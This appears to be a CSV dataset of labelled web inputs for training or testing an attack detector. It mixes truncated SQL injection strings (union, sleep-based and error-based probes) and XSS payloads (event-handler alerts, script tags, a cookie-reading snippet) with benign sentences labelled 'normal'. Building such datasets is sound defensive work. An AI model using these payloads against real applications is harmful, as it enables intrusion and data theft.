Payload,Label,text_label,ID
1' ) where 9951 = 9951 ( select ( case when ( 4587,2,SQLi,14018
"<param onclick=""alert(1)"">test</param>",1,XSS,6847
"-4145%"" ) ) union all select 9404,9404,9404,9404,9",2,SQLi,13136
<marquee><script>alert('XSS')</script></marquee>,1,XSS,1284
1' and 9254 = ( select count ( * ) from rdb$fields,2,SQLi,14053
Select beer.,0,normal,24511
"-8043%"" ) ) ) or make_set ( 9354 = 9354,7185 ) and",2,SQLi,13764
<style>@keyframes slidein {}</style><iframe style=,1,XSS,3425
"-5109 ) ) ) or make_set ( 6627 = 7331,7331 ) and (",2,SQLi,13197
"<template ondblclick=""alert(1)"">test</template>",1,XSS,8573
select * from users where id = 1.<1# union select ,2,SQLi,11786
"{""id"":null,""name"":""check""}",0,normal,26867
"{""id"":null,""firstName"":""Ng"",""lastName"":""Beng Tee"",",0,normal,27083
1' ) as yjdg where 5262 = 5262 union all select nu,2,SQLi,19014
1' or ( select * from ( select ( sleep ( 5 ) ) ) y,2,SQLi,18121
1'+ ( select 'qvif' where 1758 = 1758 union all se,2,SQLi,20449
<textarea onblur=alert(1) id=x></textarea><input a,1,XSS,7784
"-8988"" ) ) or 5023 = ctxsys.drithsx.sn ( 5023, ( c",2,SQLi,14864
<style>:target {color: red;}</style><pre id=x styl,1,XSS,1817
"<optgroup draggable=""true"" ondrag=""alert(1)"">test<",1,XSS,3588
-2210' or 5903 = ( 'qqpjq'|| ( select case 5903 wh,2,SQLi,18784
<keygen id=x onfocus=alert(1)>,1,XSS,6314
"<canvas onmousemove=""alert(1)"">test</canvas>",1,XSS,1832
1'|| ( select 'pygt' from dual where 5543 = 5543 u,2,SQLi,17155
<dt onfocusout=alert(1) tabindex=1 id=x></dt><inpu,1,XSS,2055
"<img draggable=""true"" ondragend=""alert(1)"">test</i",1,XSS,8543
"<div id=""28"">1<animate/xmlns=urn:schemas-microsoft",1,XSS,9128
select * from users where id = 1 *1 or 1 = 1 -- 1,2,SQLi,11627
Where's your SQL source?,0,normal,23417
1'|| ( select 'yucg' where 2576 = 2576 and 3754 = ,2,SQLi,19807
"<div oncut=""alert(1)"" contenteditable>test</div>",1,XSS,6883
1' ) ) as wqhm where 9871 = 9871,2,SQLi,20421
Select items where available.,0,normal,23452
-1940 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ),2,SQLi,19321
Modify the website layout for a fresh look.,0,normal,22911
"<area onkeypress=""alert(1)"" contenteditable>test</",1,XSS,5073
<u onpointermove=alert(1)>XSS</u>,1,XSS,4194
"<noframes onpaste=""alert(1)"" contenteditable>test<",1,XSS,6309
1'|| ( select 'ryyc' from dual where 5196 = 5196 o,2,SQLi,15729
"<image draggable=""true"" ondragend=""alert(1)"">test<",1,XSS,2334
1' where 9116 = 9116 and char ( 107 ) ||char ( 121,2,SQLi,22471
"-5560"" ) ) or 7292 = 6184#",2,SQLi,18155
Where clause for filtering.,0,normal,23442
"<animate attributeName=""xlink:href"" begin=""0"" from",1,XSS,9073
They must select quickly.,0,normal,24305
<q onfocusout=alert(1) tabindex=1 id=x></q><input ,1,XSS,7693
"1"" ) union all select null#",2,SQLi,12554
<code id=x tabindex=1 onbeforedeactivate=alert(1)>,1,XSS,5197
"-4964"" ) ) union all select 4750,4750,4750,4750,47",2,SQLi,14155
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHA",2,SQLi,10713
"1"" ) ) ) or elt ( 5873 = 5873,sleep ( 5 ) ) #",2,SQLi,12311
"<menuitem oncontextmenu=""alert(1)"">test</menuitem>",1,XSS,5766
""" or sleep(__TIME__)#",2,SQLi,10837
"<command onmouseout=""alert(1)"">test</command>",1,XSS,5079
"-1390%"" ) ) union all select 8930,8930,8930,8930,8",2,SQLi,13743
1' ) as xbsc where 6772 = 6772,2,SQLi,19911
<hr onpointerdown=alert(1)>XSS</hr>,1,XSS,2531
"1%"" ) ) ) and 3824 = benchmark ( 5000000,md5 ( 0x7",2,SQLi,16322
1' ) or char ( 117 ) ||char ( 111 ) ||char ( 105 ),2,SQLi,21147
"<select oncopy=""alert(1)"" contenteditable>test</se",1,XSS,8507
"1%"" ) or ( select * from ( select ( sleep ( 5 ) ) ",2,SQLi,16750
<object data=/ onreadystatechange=alert(1)>,1,XSS,8892
AND (SELECT 3122 FROM (SELECT(SLEEP(5)))YYYY) AND ,2,SQLi,11194
1%' ) ) ) and 9660 = ( select count ( * ) from all,2,SQLi,13677
"1' in boolean mode ) union all select null,null,nu",2,SQLi,14851
"1%"" ) or elt ( 5873 = 5873,sleep ( 5 ) ) #",2,SQLi,13817
"1%"" union all select null,null--",2,SQLi,20962
"1' and ( select 9067 from ( select count ( * ) ,co",2,SQLi,21706
"<audio oncut=""alert(1)"" contenteditable>test</audi",1,XSS,4797
"<nextid onbeforecopy=""alert(1)"" contenteditable>te",1,XSS,3846
"<frameset onkeydown=""alert(1)"" contenteditable>tes",1,XSS,2780
"1"" ) ) ) and 8312 = dbms_pipe.receive_message ( ch",2,SQLi,17841
"<canvas draggable=""true"" ondragenter=""alert(1)"">te",1,XSS,6874
Where's the citadel?,0,normal,23575
<header onpointermove=alert(1)>XSS</header>,1,XSS,4309
"<applet onmouseenter=""alert(1)"">test</applet>",1,XSS,6227
"<ins draggable=""true"" ondragstart=""alert(1)"">test<",1,XSS,5046
"<code onclick=""alert(1)"">test</code>",1,XSS,6101
<image onpointermove=alert(1)>XSS</image>,1,XSS,7896
1 and 8594 = ( select 8594 from pg_sleep ( 5 ) ) -,2,SQLi,19869
1' ) or ( select 2* ( if ( ( select * from ( selec,2,SQLi,12702
<header id=x tabindex=1 onbeforeactivate=alert(1)>,1,XSS,8895
"1%' ) ) or row ( 1045,7562 ) > ( select count ( * ",2,SQLi,14367
<time onpointerleave=alert(1)>XSS</time>,1,XSS,4331
Create a quiz.,0,normal,22887
"<thead onmouseup=""alert(1)"">test</thead>",1,XSS,3508
"<style>@keyframes x{}</style><table style=""animati",1,XSS,3790
Sexy nursing bras are often designer items that mu,0,normal,25558
1' ) where 3730 = 3730 and sleep ( 5 ) #,2,SQLi,22124
Grab a free Google Home Mini with the purchase of ,0,normal,26134
"{""id"":null,""name"":""Genesect""}",0,normal,27456
I'm considering where to go for a creative class.,0,normal,23786
"<param onbeforepaste=""alert(1)"" contenteditable>te",1,XSS,5257
<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#000,1,XSS,252
Bercow might however select further amendments bef,0,normal,26325
<style>:target {color: red;}</style><bdi id=x styl,1,XSS,4018
"-7043"" ) where 9755 = 9755 union all select 9755,9",2,SQLi,20807
I need to select the right paint colors for the ro,0,normal,23861
"1' or row ( 1045,7562 ) > ( select count ( * ) ,co",2,SQLi,21410
"-3007 ) where 6648 = 6648 union all select 6648,66",2,SQLi,20622
"1"" ) ) as irrz where 8730 = 8730 order by 1#",2,SQLi,17298
1' ) as fkpn where 1100 = 1100,2,SQLi,20738
Save up to 49% off select Sabrent USB hubs & docki,0,normal,25710
"-4923"" or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ",2,SQLi,22003
1'|| ( select 'fmss' from dual where 7025 = 7025 o,2,SQLi,19502
"1' ) ) ) and make_set ( 9514 = 8668,8668 ) and ( (",2,SQLi,18248
1 ) ) as qsos where 2721 = 2721 rlike ( select * f,2,SQLi,17039
"<style>@keyframes x{}</style><form style=""animatio",1,XSS,2223
"-9361"" ) ) union all select 3112#",2,SQLi,20720
1%' ) ) or char ( 75 ) ||char ( 70 ) ||char ( 99 ),2,SQLi,21054
"<br onpaste=""alert(1)"" contenteditable>test</br>",1,XSS,5038
"1%' ) union all select null,null,null,null,null,nu",2,SQLi,14743
"<tbody onmouseover=""alert(1)"">test</tbody>",1,XSS,3743
1' or 2633 = dbms_pipe.receive_message ( chr ( 112,2,SQLi,22328
"1', ( select ( case when ( 4209 = 5879 ) then 1 el",2,SQLi,18551
1' where 7417 = 7417 and 8407 = ( select count ( *,2,SQLi,21369
"{""id"":null,""name"":""Hammerhead Shark""}",0,normal,27259
"<abbr onkeyup=""alert(1)"" contenteditable>test</abb",1,XSS,7219
1' ) ) ) and 5556 = ( select count ( * ) from all_,2,SQLi,21325
"<div draggable=""true"" contenteditable>drag me</div",1,XSS,5738
"1"" ) and 2006 = 2006",2,SQLi,22347
<video><source onerror=alert(1) src=1></video>,1,XSS,5102
<span onfocusout=alert(1) tabindex=1 id=x></span><,1,XSS,7596
"Instead, they're looking to help out a select grou",0,normal,25979
"<div draggable=""true"" contenteditable>drag me</div",1,XSS,5018
1'|| ( select 'lzzr' where 2477 = 2477,2,SQLi,15987
"( select count ( * ) from sysibm.systables as t1,s",2,SQLi,16781
"1"" ) and 6969 = ( select 6969 from pg_sleep ( 5 ) ",2,SQLi,14076
AS INJECTX WHERE 1=1 AND 1=0#,2,SQLi,10234
1'|| ( select 'dyuw' from dual where 2037 = 2037,2,SQLi,21878
-9202' where 9799 = 9799 or 4747 = dbms_utility.sq,2,SQLi,12898
1' ) ) as pqbq where 1865 = 1865,2,SQLi,14038
&lt;SCRIPT SRC=&quot;http://ha.ckers.org/xss.jpg&q,1,XSS,1421
"<;DIV STYLE="";background-image: url(&;#1;javascrip",1,XSS,1588
Select the correct path.,0,normal,24309
<br id=x tabindex=1 onbeforeactivate=alert(1)></br,1,XSS,5730
-3137'|| ( select 'btif' where 1718 = 1718 union a,2,SQLi,14230
Retrieve records where needed.,0,normal,23469
They must select now.,0,normal,24264
"When in doubt, buy a gift card so they can select ",0,normal,25156
")) AND 1337=BENCHMARK(5000000,MD5(0x774c5341)) AND",2,SQLi,11292
1 ) ) as smtf where 5829 = 5829,2,SQLi,21037
Where's the astrologer?,0,normal,23652
"<sub onmouseenter=""alert(1)"">test</sub>",1,XSS,2840
Sort the books.,0,normal,22830
"select count ( * ) from rdb$fields as t1,rdb$types",2,SQLi,20808
<figure onpointerleave=alert(1)>XSS</figure>,1,XSS,4379
-6947' ) ) as qqjp where 6700 = 6700 union all sel,2,SQLi,20990
"<dir onmouseleave=""alert(1)"">test</dir>",1,XSS,6868
select ( case when ( 4043 = 5276 ) then 4043 else ,2,SQLi,19767
"<del onmouseleave=""alert(1)"">test</del>",1,XSS,3868
"<rb ondblclick=""alert(1)"">test</rb>",1,XSS,6818
1' or ( select 2* ( if ( ( select * from ( select ,2,SQLi,18874
"1"" ) ) as qgwq where 6122 = 6122",2,SQLi,20249
"1"" and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) |",2,SQLi,12466
"<iframe draggable=""true"" ondragenter=""alert(1)"">te",1,XSS,7824
"1"" ) procedure analyse ( extractvalue ( 9255,conca",2,SQLi,17207
"1' and extractvalue ( 7982,concat ( 0x5c,0x7171706",2,SQLi,13985
"<abbr onmouseover=""alert(1)"">test</abbr>",1,XSS,7545
"-1593' or elt ( 7044 = 6125,6125 ) and 'zkuz' = 'z",2,SQLi,21893
<dfn onpointermove=alert(1)>XSS</dfn>,1,XSS,2273
1 ) ) as vzgo where 6281 = 6281 and 8514 = ( selec,2,SQLi,19852
"<style>@keyframes x{}</style><output style=""animat",1,XSS,8293
"-8136' ) union all select 1324,1324,1324,1324#",2,SQLi,16227
ORDER BY 26#,2,SQLi,10299
"1' ) ) ) union all select null,null,null,null,null",2,SQLi,22371
"1', ( select * from generate_series ( 2636,2636,ca",2,SQLi,19868
Order pizza tonight.,0,normal,22772
1' ) as upgb where 2031 = 2031,2,SQLi,12670
"OR 1337=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000",2,SQLi,11358
"<? foo=""><x foo='?><script>alert(1)</script>'>"">",1,XSS,965
"{""id"":null,""firstName"":""Ivan"",""lastName"":""Soh"",""sp",0,normal,27410
"1"" where 9241 = 9241 union all select null#",2,SQLi,21612
"{""id"":null,""name"":""low soft""}",0,normal,27349
<svg><video onload=alert(1)></video>,1,XSS,4708
"-7635"" union all select 1284,1284,1284,1284,1284,1",2,SQLi,12428
<u onfocusout=alert(1) tabindex=1 id=x></u><input ,1,XSS,5855
1 ) ) ) or char ( 68 ) ||char ( 69 ) ||char ( 97 ),2,SQLi,14305
"<nav onmouseup=""alert(1)"">test</nav>",1,XSS,8938
Where's the hot spring?,0,normal,23612
call regexp_substring ( repeat ( right ( char ( 37,2,SQLi,17890
<dir id=x tabindex=1 onbeforeactivate=alert(1)></d,1,XSS,5117
"-1639 ) ) or 5023 = ctxsys.drithsx.sn ( 5023, ( ch",2,SQLi,18380
Can you help me decide where to go for a jog?,0,normal,23728
<area onpointerup=alert(1)>XSS</area>,1,XSS,6692
1'+ ( select 'yyyn' where 5395 = 5395,2,SQLi,21690
"-9389' where 5713 = 5713 union all select 5713,571",2,SQLi,17349
With few exceptions tapeworms select the small int,0,normal,25114
<style>:target {transform: rotate(180deg);}</style,1,XSS,8554
1' ) where 5279 = 5279 or sleep ( 5 ) #,2,SQLi,16859
"<li onkeypress=""alert(1)"" contenteditable>test</li",1,XSS,4681
"<pre onmouseover=""alert(1)"">test</pre>",1,XSS,6293
<map id=x tabindex=1 onactivate=alert(1)></map>,1,XSS,3277
<isindex id=x tabindex=1 onbeforeactivate=alert(1),1,XSS,5467
"1"" where 1831 = 1831 and ( select * from ( select ",2,SQLi,14785
"<abbr oncontextmenu=""alert(1)"">test</abbr>",1,XSS,7680
<sup onfocusout=alert(1) tabindex=1 id=x></sup><in,1,XSS,2784
call regexp_substring ( repeat ( left ( crypt_key ,2,SQLi,20259
<style>:target {transform: rotate(180deg);}</style,1,XSS,3531
"1' and elt ( 1210 = 1210,sleep ( 5 ) )",2,SQLi,16688
"<;XML ID="";xss"";>;<;I>;<;B>;<;IMG SRC="";javas<;!--",1,XSS,1625
"<div draggable=""true"" contenteditable>drag me</div",1,XSS,4663
1 ) and 5556 = ( select count ( * ) from all_users,2,SQLi,14730
"<meter onmouseup=""alert(1)"">test</meter>",1,XSS,5006
"{""id"":null,""firstName"":""Jeff"",""lastName"":""Toh"",""ad",0,normal,27418
1' ) ) ) or exp ( ~ ( select * from ( select conca,2,SQLi,20437
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHA",2,SQLi,10699
call regexp_substring ( repeat ( right ( char ( 37,2,SQLi,15593
1' ) ) or 5286 = ( select count ( * ) from all_use,2,SQLi,13220
The platform will be available in other select mar,0,normal,25396
"<LINK REL=""stylesheet"" HREF=""http://.rocks/.css"">",1,XSS,6677
1%' ) ) ) and 9198 = 9198--,2,SQLi,19138
Select a workout routine that suits you.,0,normal,24064
1'+ ( select afst where 7454 = 7454 and 3202 = lik,2,SQLi,12712
%253cscript%253ealert(document.cookie)%253c/script,1,XSS,1133
level,0,normal,23229
"<IMG SRC=x ondragstart=""alert(String.fromCharCode(",1,XSS,1212
"1%' ) ) and 8148 = like ( 'abcdefg',upper ( hex ( ",2,SQLi,19571
